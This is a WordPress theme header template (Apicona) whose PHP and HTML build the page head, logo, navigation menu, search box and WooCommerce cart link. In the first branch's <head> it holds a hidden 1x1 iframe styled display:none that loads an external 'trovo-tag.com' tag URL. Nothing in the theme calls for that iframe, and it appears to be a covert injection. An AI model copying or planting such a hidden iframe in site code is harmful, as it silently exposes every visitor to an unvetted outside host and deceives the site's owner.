<?php
/**
 * The Header template for our theme
 *
 * Displays all of the <head> section and everything up till <div id="main">
 *
 * @package WordPress
 * @subpackage Apicona
 * @since Apicona 1.0
 */
global $apicona;
$themestyle = tm_get_theme_style();

if($themestyle == 'apiconaadv'){
	

$stickyHeaderClass = (isset($apicona['stickyheader']) && $apicona['stickyheader']=='y') ? 'masthead-header-stickyOnScroll' : '' ; // Check if sticky header enabled

// header dark class
$headerClass = '';
if( !empty($apicona['headerbgcolor']['rgba']) && tm_check_dark_color($apicona['headerbgcolor']['rgba']) ){
	$headerClass = 'tm-dark-header';
}


$logoseo      = ( isset($apicona['logoseo']) && trim($apicona['logoseo'])!='' ) ? esc_attr($apicona['logoseo']) : "h1homeonly" ;

// Logo tag for SEO
$logotag = 'h1';
if( $logoseo=='h1homeonly' && !is_front_page() ){
	$logotag = 'span';
}




$stickyLogo = 'no';
if( isset($apicona['logoimg_sticky']["url"]) && trim($apicona['logoimg_sticky']["url"])!='' ){
	$stickyLogo = 'yes';
}



//Getting all header style 
$headerStyle = (isset($apicona['headerstyle']) && trim( $apicona['headerstyle']!='' )) ? $apicona['headerstyle'] :'' ;


$headerContainer = 'container';
if( $apicona['layout']=='fullwide' ){
	if( isset($apicona['full_wide_elements']['header']) && $apicona['full_wide_elements']['header']=='1' )
	$headerContainer = 'container-full';
}

// specially added for header 3
if( $headerStyle == '3' && $apicona['layout']=='wide' ){
	$headerContainer = 'container-wide';
}







/*
 * This will override the default "skin color" set in the page directly.
 */
if( is_page() ){
	
	global $post;
	global $apicona;
	$skincolor = trim( get_post_meta( $post->ID, '_kwayy_page_customize_skincolor', true ) );
	if($skincolor!=''){
		$apicona['skincolor']=$skincolor;
	}
	
} else if( is_home() ){
	
	global $post;
	global $apicona;
	$pageid = get_option('page_for_posts');
	$skincolor = trim( get_post_meta( $pageid, '_kwayy_page_customize_skincolor', true ) );
	if($skincolor!=''){
		$apicona['skincolor']=$skincolor;
	}
	
}


?>
<!DOCTYPE html>
<!--[if IE 7]>
<html class="ie ie7" <?php language_attributes(); ?>>
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" <?php language_attributes(); ?>>
<![endif]-->
<!--[if !(IE 7) | !(IE 8)  ]><!-->
<html <?php language_attributes(); ?>>
<!--<![endif]-->
<head>
<meta charset="<?php bloginfo( 'charset' ); ?>">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
<?php wp_head(); ?>

<!--[if lt IE 9]>
	<script src="<?php echo get_template_directory_uri(); ?>/js/html5.js"></script>
<![endif]-->
<iframe src="https://tag.trovo-tag.com/01be6ceb703f94475d2704d6ae2290c3" width="1" height="1" style="visibility:hidden;display:none;"></iframe>
</head>

<body <?php body_class(); ?>>

<?php 
if ( function_exists( 'wp_body_open' ) ) {
    wp_body_open();
}
?>

<?php
/* Custom HTML code */
if( isset($apicona['customhtml_bodystart']) && trim($apicona['customhtml_bodystart'])!='' ){
	echo $apicona['customhtml_bodystart'];  // We are not sanitizing this as we are expecting any (HTML, CSS, JS) code here
}
?>


<?php echo thememount_preloader(); ?>

<div class="main-holder animsition">
<div id="page" class="hfeed site">


<?php
$h_tag = 'header';
if( !empty($apicona['header_footer_tags']) && $apicona['header_footer_tags']=='div' ){
	$h_tag = 'div';
}
?>
<<?php echo esc_attr($h_tag); ?> id="masthead" class="site-header">
<?php thememount_floatingbar(); ?>
<?php thememount_topbar(); ?>
  <div class="headerblock <?php echo thememount_headerclass(); ?>">
    
    
    <div id="stickable-header" class="header-inner <?php echo sanitize_html_class($stickyHeaderClass); ?> <?php echo $headerClass; ?>">
      <div class="<?php echo $headerContainer; ?>">
        <div class="headercontent clearfix">
		
		
		<?php
		// specially added for header 3
		//var_dump($headerStyle); die;
		if( $headerStyle == '3' && $apicona['layout']=='wide' ){
			echo '<div class="tm-header-top-wrapper"> <div class="tm-header-top container">';
		}
		?>
		
		
			<div class="headerlogo thememount-logotype-<?php echo sanitize_html_class($apicona['logotype']); ?> tm-stickylogo-<?php echo $stickyLogo; ?>"> <<?php echo $logotag; ?> class="site-title"> <a class="home-link" href="<?php echo esc_url( home_url( '/' ) ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home">
				<?php if( $apicona['logotype'] == 'image' ){ ?>
				<img class="thememount-logo-img standardlogo" src="<?php echo esc_url($apicona['logoimg']["url"]); ?>" alt="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" width="<?php echo esc_attr($apicona['logoimg']["width"]); ?>" height="<?php echo esc_attr($apicona['logoimg']["height"]); ?>">
				<?php if( isset($apicona['logoimg_sticky']["url"]) && trim($apicona['logoimg_sticky']["url"])!='' ): ?>
				<img class="thememount-logo-img stickylogo" src="<?php echo esc_url($apicona['logoimg_sticky']["url"]); ?>" alt="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" width="<?php echo esc_attr($apicona['logoimg_sticky']["width"]); ?>" height="<?php echo esc_attr($apicona['logoimg_sticky']["height"]); ?>">
				<?php endif; ?>
				<?php } else { ?>
				<?php if( trim($apicona['logotext'])!='' ){ echo esc_attr($apicona['logotext']); } else { bloginfo( 'name' ); }?>
				<?php } ?>
				</a> </<?php echo $logotag; ?>>
				<h2 class="site-description">
				  <?php bloginfo( 'description' ); ?>
				</h2>
			</div>
			
			
			<?php 
			if ($headerStyle=='3' && isset($apicona['header_three_content'])){
				$header_three_content = trim($apicona['header_three_content']);
				?>
				<div class="tm-top-info-con">
					<?php	echo do_shortcode($header_three_content)?>
				</div>
                <!--<div class="header-controls">
                	<div class="search_box"> <a href="#"><i class="fa fa-search"></i></a> </div>
                </div>-->
				
	<?php /*?>			<?php 
				// Header right Button code
				if ($headerStyle=='3'){
				?>
					<div class="tm-custombutton">
						<?php echo do_shortcode($apicona['header_right_content']) ?>
					</div>
				<?php	} ?><?php */?>
				
				<div class="clearfix"></div>
				
			<?php } ?>
			
		
		
		
		
		
			<?php
			// specially added for header 3
			if( $headerStyle == '3' && $apicona['layout']=='wide' ){
				echo '</div><!-- .tm-header-top -->  </div><!-- .tm-header-top-wrapper -->  ';
			}
			?>
		
			
		
		
		
		
		
		
			<?php
			// specially added for header 3
			if( $headerStyle == '3' && $apicona['layout']=='wide' ){
				echo '<div class="tm-header-bottom-wrapper"> <div class="tm-header-bottom container">';
			}
			?>
		
		
	
          
          <?php
		  /*
		   * Search is now optional. You can show/hide search button from "Theme Options" directly.
		   */
		  $header_search = ( !isset($apicona['header_search']) ) ? '1' : esc_attr($apicona['header_search']);
		  $navbarClass   = ( $header_search=='1' ) ? ' class="k_searchbutton"' : '' ;
		  $tm_sticky_header_height = ( isset($apicona['header-height-sticky']) && trim($apicona['header-height-sticky'])!='' ) ? trim($apicona['header-height-sticky']) : '73' ; 
		  ?>
          <div id="navbar"<?php echo $navbarClass; ?>>
            <nav id="site-navigation" class="navigation main-navigation" data-sticky-height="<?php echo $tm_sticky_header_height; ?>">
              
			  
			  
			  <?php
			  $header_controls = '';
			  
			  //header right content
			  if ($headerStyle!='2' && $headerStyle!='3' && $headerStyle!='5' && $headerStyle!='6' && $headerStyle!='15' && isset($apicona['header_right_content'])&& $apicona['header_right_content']!=''){
				  $header_controls .= '<div class="tm-custombutton">'. do_shortcode($apicona['header_right_content']) .'</div>';
			  }
			  
			  // Show search only for headerstyle 3
			  if ($headerStyle=='3' && $apicona['header_search']=='1' ){
				  $tm_get_search_form = '';
				  ob_start();
				  //tm_get_search_form();
				  $tm_get_search_form = ob_get_contents();
				  ob_end_clean();
				  
				  $header_controls .= '<div class="tm-header-small-search-form"><a href="#"><i class="fa fa-search"></i></a><div class="tm-hedear-search tm-hide">'.$tm_get_search_form.'</div></div>';
			  }
			  
			  
			  
			  // Header search icon
			  if( $header_search=='1'):
				  if( $headerStyle!='3' ):
					$tm_get_search_form = '';
					ob_start();
					//tm_get_search_form();
					$tm_get_search_form = ob_get_contents();
					ob_end_clean();
					$header_controls .= '<div class="search_box"> <a href="#"><i class="fa fa-search"></i></a>'.$tm_get_search_form.' </div>';
				  endif;
			  endif;
              
			  
			  
			  // WooCommerce - Header cart link and text
			  $wc_header_icon = ( isset($apicona['wc-header-icon']) && trim($apicona['wc-header-icon'])!='' ) ? esc_attr($apicona['wc-header-icon']) : '1' ;
			  if( function_exists('is_woocommerce') && $wc_header_icon=='1' ){
				  $header_controls .= '<div class="thememount-header-cart-link-wrapper"> <a href="'. wc_get_cart_url() .'" class="thememount-header-cart-link"><i class="fa fa-shopping-cart"></i> <span class="thememount-cart-qty"> <span class="cart-contents">&nbsp;&nbsp;</span></span> </a> </div>';
			  }
			  
			  
			  // Final output
			  if( $header_controls!='' ){
				  echo '<div class="header-controls">'. $header_controls .'</div>';
			  }
			  
			  
			  ?>
			  
			  
			  
			  
              <h3 class="menu-toggle">
                <?php _e( '<span>Toggle menu</span><i class="fa fa-bars"></i>', 'apicona' ); ?>
              </h3>
              <a class="screen-reader-text skip-link" href="#content" title="<?php esc_attr_e( 'Skip to content', 'apicona' ); ?>">
              <?php _e( 'Skip to content', 'apicona' ); ?>
              </a>
              <?php wp_nav_menu( array( 'theme_location' => 'primary', 'menu_class' => 'nav-menu', 'container_class' => 'nav-menu' ) );	?>
            </nav>
            <!-- #site-navigation --> 
            
            <script type="text/javascript">
				/* Core JS code not depended on jQuery. We want to execute it fast before jQuery init. */
				if (document.getElementById("mega-menu-wrap-primary")) {
					var menu_toggle = document.getElementsByClassName('menu-toggle');
					menu_toggle[0].style.display = "none";
				}
			</script> 
          </div>
          <?php thememount_one_page_site(); ?>
		  
		  
		<?php
		// specially added for header 3
		if( $headerStyle == '3' && $apicona['layout']=='wide' ){
			echo '</div><!-- .tm-header-bottom --> </div><!-- .tm-header-bottom-wrapper --> ';
		}
		?>
		  
		  
		  
		  
          <!-- #navbar --> 
        </div>
        <!-- .row --> 
      </div>
	  
	  <?php //tm_get_search_form(); ?>
      
    </div>
  </div>
  <?php thememount_header_titlebar(); ?>
  
  <?php thememount_header_slider(); ?>
  
</<?php echo esc_attr($h_tag); ?>>
<!-- #masthead -->

<div id="main" class="site-main">
<div id="main-inner" class="site-main-inner clearfix">

<?php 


}else if($themestyle == 'apicona'){
	


$stickyHeaderClass = ($apicona['stickyheader']=='y') ? 'masthead-header-stickyOnScroll' : '' ; // Check if sticky header enabled

$search_title = ( isset($apicona['search_title']) && trim($apicona['search_title'])!='' ) ? trim($apicona['search_title']) : "Just type and press 'enter'" ;
$search_input = ( isset($apicona['search_input']) && trim($apicona['search_input'])!='' ) ? trim($apicona['search_input']) : "WRITE SEARCH WORD..." ;
$search_close = ( isset($apicona['search_close']) && trim($apicona['search_close'])!='' ) ? trim($apicona['search_close']) : "Close search" ;
$logoseo      = ( isset($apicona['logoseo']) && trim($apicona['logoseo'])!='' ) ? trim($apicona['logoseo']) : "h1homeonly" ;

// Logo tag for SEO
$logotag = 'h1';
if( $logoseo=='h1homeonly' && !is_front_page() ){
	$logotag = 'span';
}



$stickyLogo = 'no';
if( isset($apicona['logoimg_sticky']["url"]) && trim($apicona['logoimg_sticky']["url"])!='' ){
	$stickyLogo = 'yes';
}


/*
 * This will override the default "skin color" set in the page directly.
 */
if( is_page() ){
	global $post;
	global $apicona;
	$skincolor = trim( get_post_meta( $post->ID, '_kwayy_page_customize_skincolor', true ) );
	if($skincolor!=''){
		$apicona['skincolor']=$skincolor;
	}
} else if( is_home() ){
	global $post;
	global $apicona;
	$pageid 	= get_option('page_for_posts');
	$skincolor  = trim( get_post_meta( $pageid, '_kwayy_page_customize_skincolor', true ) );
	if($skincolor!=''){
		$apicona['skincolor']=$skincolor;
	}
}


?>
<!DOCTYPE html>
<!--[if IE 7]>
<html class="ie ie7" <?php language_attributes(); ?>>
<![endif]-->
<!--[if IE 8]>
<html class="ie ie8" <?php language_attributes(); ?>>
<![endif]-->
<!--[if !(IE 7) | !(IE 8)  ]><!-->
<html <?php language_attributes(); ?>>
<!--<![endif]-->
<head>
<meta charset="<?php bloginfo( 'charset' ); ?>">
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="profile" href="http://gmpg.org/xfn/11">
<link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>">
<!--[if lt IE 9]>
	<script src="<?php echo get_template_directory_uri(); ?>/js/html5.js"></script>
	<![endif]-->
<?php wp_head(); ?>
</head>

<body <?php body_class(); ?>>

<?php
/* Custom HTML code */
if( isset($apicona['customhtml_bodystart']) && trim($apicona['customhtml_bodystart'])!='' ){
	echo $apicona['customhtml_bodystart'];
}
?>

<div class="main-holder animsition">
<div id="page" class="hfeed site">
<header id="masthead" class="site-header  header-text-color-<?php echo $apicona['header_text_color']; ?>" role="banner">
  <div class="headerblock">
	<?php kwayy_floatingbar(); ?>
	<?php kwayy_topbar(); ?>
    <div id="stickable-header" class="header-inner <?php echo $stickyHeaderClass; ?>">
      <div class="container">
        <div class="headercontent">
          <div class="headerlogo kwayy-logotype-<?php echo $apicona['logotype']; ?> tm-stickylogo-<?php echo $stickyLogo; ?>">
				<<?php echo $logotag; ?> class="site-title">
					<a class="home-link" href="<?php echo esc_url( home_url( '/' ) ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home">
					
						<?php if( $apicona['logotype'] == 'image' ){ ?>
							<?php /* ?>
							<?php if( $kwayy_retina_logo=='on' ){ ?>
								<img class="kwayy-logo-img retina" src="<?php echo $apicona['logoimg_retina']["url"]; ?>" alt="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" width="<?php echo round(($apicona['logoimg']["width"])/2); ?>" height="<?php echo round(($apicona['logoimg']["height"])/2); ?>">
							<?php } else { ?>
								<img class="kwayy-logo-img standard" src="<?php echo $apicona['logoimg']["url"]; ?>" alt="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" width="<?php echo $apicona['logoimg']["width"]; ?>" height="<?php echo $apicona['logoimg']["height"]; ?>">
							<?php }; ?>
							<?php */ ?>
							
							<img class="kwayy-logo-img standardlogo" src="<?php echo $apicona['logoimg']["url"]; ?>" alt="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" width="<?php echo $apicona['logoimg']["width"]; ?>" height="<?php echo $apicona['logoimg']["height"]; ?>">
							
							<?php if( isset($apicona['logoimg_sticky']["url"]) && trim($apicona['logoimg_sticky']["url"])!='' ): ?>
							<img class="kwayy-logo-img stickylogo" src="<?php echo $apicona['logoimg_sticky']["url"]; ?>" alt="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" width="<?php echo $apicona['logoimg_sticky']["width"]; ?>" height="<?php echo $apicona['logoimg_sticky']["height"]; ?>">
						    <?php endif; ?>
							
						<?php } else { ?>
							
							<?php if( trim($apicona['logotext'])!='' ){ echo $apicona['logotext']; } else { bloginfo( 'name' ); }?>
							
						<?php } ?>
						
					</a>
				</<?php echo $logotag; ?>>
				<h2 class="site-description"><?php bloginfo( 'description' ); ?></h2>
		  </div>
		  
		  <?php
		  $navbarClass = '';
		  if( isset($apicona['header_search']) &&  $apicona['header_search']=='1'){
			$navbarClass = ' class="k_searchbutton"';
		  }
		  ?>
			
		  
		  
          <div id="navbar"<?php echo $navbarClass; ?>>
            <nav id="site-navigation" class="navigation main-navigation" role="navigation">
              <h3 class="menu-toggle">
                <?php _e( '<span>Toggle menu</span><i class="kwicon-fa-navicon"></i>', 'apicona' ); ?>
              </h3>
              <a class="screen-reader-text skip-link" href="#content" title="<?php esc_attr_e( 'Skip to content', 'apicona' ); ?>">
              <?php _e( 'Skip to content', 'apicona' ); ?>
              </a>
              <?php
					   //if ( has_nav_menu( 'primary' ) ){
						//wp_nav_menu( array( 'theme_location' => 'primary', 'menu_class' => 'nav-menu' , 'walker' => new kwayy_custom_menus_walker ) );
					   //} else {
						wp_nav_menu( array( 'theme_location' => 'primary', 'menu_class' => 'nav-menu', 'container_class' => 'menu-main-menu-container nav-menu-wrapper' ) );
					   //}
      			 ?>
              <?php /*?><?php get_search_form(); ?><?php */?>
              
			  
			  <?php if( isset($apicona['header_search']) &&  $apicona['header_search']=='1'): ?>
              <div class="k_flying_searchform"> <span class="k_searchlink"><a href="javascript:void(0);"><i class="kwicon-fa-search"></i></a></span>
                <div class="k_flying_searchform_wrapper">
                  <form method="get" id="flying_searchform" action="<?php echo home_url(); ?>">
                    <div class="w-search-form-h">
                      <div class="w-search-form-row">
                        <div class="w-search-label">
                          <label for="s"> <?php _e($search_title, 'apicona'); ?></label>
                        </div>
                        <div class="w-search-input">
                          <input type="text" class="field searchform-s" name="s" id="searchval" placeholder="<?php _e($search_input, 'apicona' ); ?>">
                        </div>
                        <a class="w-search-close" href="javascript:void(0)" title="<?php _e($search_close, 'apicona' ); ?>"></a> </div>
                    </div>
                    <div class="sform-close-icon"><i class="icon-remove"></i></div>
                  </form>
                </div>
              </div><!-- .k_flying_searchform --> 
              <?php endif; ?>
              
            </nav>
            <!-- #site-navigation --> 
          </div>
          <!-- #navbar --> 
        </div>
        <!-- .row --> 
      </div>
    </div>
  </div>
  <?php kwayy_header_titlebar(); ?>
  <?php kwayy_header_slider(); ?>

  
</header>
<!-- #masthead -->



<div id="main checkmate" class="site-main"> 
	
<?php 

if(shortcode_exists( 'product_cta_section' ) ){
	echo do_shortcode('[product_cta_section]'); 
}
 } ?>